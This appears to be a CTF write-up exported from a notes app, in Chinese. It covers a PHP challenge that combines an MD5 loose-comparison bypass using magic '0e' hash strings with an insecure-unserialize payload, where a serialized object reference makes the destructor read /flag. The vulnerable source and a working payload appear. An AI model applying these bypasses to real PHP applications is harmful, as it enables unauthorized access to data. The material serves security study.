{"ID":"20241017131219-d7zv6ye","Spec":"1","Type":"NodeDocument","Properties":{"id":"20241017131219-d7zv6ye","title":"php","updated":"20241017132129"},"Children":[{"ID":"20241017131859-bjej9ta","Type":"NodeParagraph","Properties":{"id":"20241017131859-bjej9ta","updated":"20241017131906"},"Children":[{"Type":"NodeText","Data":"题一"}]},{"ID":"20241017131907-afoa134","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"Properties":{"id":"20241017131907-afoa134","updated":"20241017131908"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```"},{"Type":"NodeCodeBlockFenceInfoMarker","CodeBlockInfo":"YmFzaA=="},{"Type":"NodeCodeBlockCode","Data":"class BUU {\n   public $correct = \"\";\n   public $input = \"\";\n\n   public function __destruct() {\n       try {\n           $this-\u003ecorrect = base64_encode(uniqid());\n           if($this-\u003ecorrect === $this-\u003einput) {\n               echo file_get_contents(\"/flag\");\n           }\n       } catch (Exception $e) {\n       }\n   }\n}\n\nif($_GET['pleaseget'] === '1') {\n    if($_POST['pleasepost'] === '2') {\n        if(md5($_POST['md51']) == md5($_POST['md52']) \u0026\u0026 $_POST['md51'] != $_POST['md52']) {\n            unserialize($_POST['obj']);\n        }\n    }\n}\n"},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```"}]},{"ID":"20241017131859-0k167b2","Type":"NodeParagraph","Properties":{"id":"20241017131859-0k167b2"}},{"ID":"20241017131219-3f1z6e5","Type":"NodeParagraph","Properties":{"id":"20241017131219-3f1z6e5","updated":"20241017131942"},"Children":[{"Type":"NodeTextMark","TextMarkType":"strong","TextMarkTextContent":"弱类型"}]},{"ID":"20241017131226-hd7qgli","Type":"NodeParagraph","Properties":{"id":"20241017131226-hd7qgli","updated":"20241017131227"},"Children":[{"Type":"NodeText","Data":"尽管 "},{"Type":"NodeTextMark","TextMarkType":"inline-math","TextMarkInlineMathContent":"str1 和 "},{"Type":"NodeText","Data":"str2 是不同的字符串，由于它们都以 0e 开头并后跟数字，它们被弱类型比较认为是相等的，输出 “Equal”。\n 所以我们现在就可以找"},{"Type":"NodeTextMark","TextMarkType":"strong","TextMarkTextContent":"两个值加密后0e开头，且0e后面是纯数字的字符串即可"}]},{"ID":"20241017131239-sm9h2zq","Type":"NodeTable","TableAligns":[2,2],"Properties":{"colgroup":"|","id":"20241017131239-sm9h2zq","updated":"20241017131239"},"Children":[{"Type":"NodeTableHead","Data":"thead","Children":[{"Type":"NodeTableRow","Data":"tr","Children":[{"Type":"NodeTableCell","Data":"th","TableCellAlign":2,"Children":[{"Type":"NodeText","Data":"字符串"}]},{"Type":"NodeTableCell","Data":"th","TableCellAlign":2,"Children":[{"Type":"NodeText","Data":"md5"}]}]}]},{"Type":"NodeTableRow","Data":"tr","Children":[{"Type":"NodeTableCell","Data":"td","TableCellAlign":2,"Children":[{"Type":"NodeText","Data":"QNKCDZO"}]},{"Type":"NodeTableCell","Data":"td","TableCellAlign":2,"Children":[{"Type":"NodeText","Data":"0e830400451993494058024219903391"}]}]},{"Type":"NodeTableRow","Data":"tr","Children":[{"Type":"NodeTableCell","Data":"td","TableCellAlign":2,"Children":[{"Type":"NodeText","Data":"s155964671a"}]},{"Type":"NodeTableCell","Data":"td","TableCellAlign":2,"Children":[{"Type":"NodeText","Data":"0e342768416822451524974117254469"}]}]},{"Type":"NodeTableRow","Data":"tr","Children":[{"Type":"NodeTableCell","Data":"td","TableCellAlign":2,"Children":[{"Type":"NodeText","Data":"s878926199a"}]},{"Type":"NodeTableCell","Data":"td","TableCellAlign":2,"Children":[{"Type":"NodeText","Data":"0e545993274517709034328855841020"}]}]}]},{"ID":"20241017131943-hsyrcyh","Type":"NodeParagraph","Properties":{"id":"20241017131943-hsyrcyh","updated":"20241017132024"},"Children":[{"Type":"NodeText","Data":"uniqid()  产生的数是随机变化的，无法预测，所以input传值无法确定，这里就固定值下来"}]},{"ID":"20241017132042-8ziuab7","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"Properties":{"id":"20241017132042-8ziuab7","updated":"20241017132105"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```"},{"Type":"NodeCodeBlockFenceInfoMarker","CodeBlockInfo":"YmFzaA=="},{"Type":"NodeCodeBlockCode","Data":"obj的值是O:3:\"BUU\":2:{s:7:\"correct\";s:0:\"\";s:5:\"input\";R:2;}\n"},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```"}]},{"ID":"20241017132129-ukuc9qw","Type":"NodeParagraph","Properties":{"id":"20241017132129-ukuc9qw"}}]}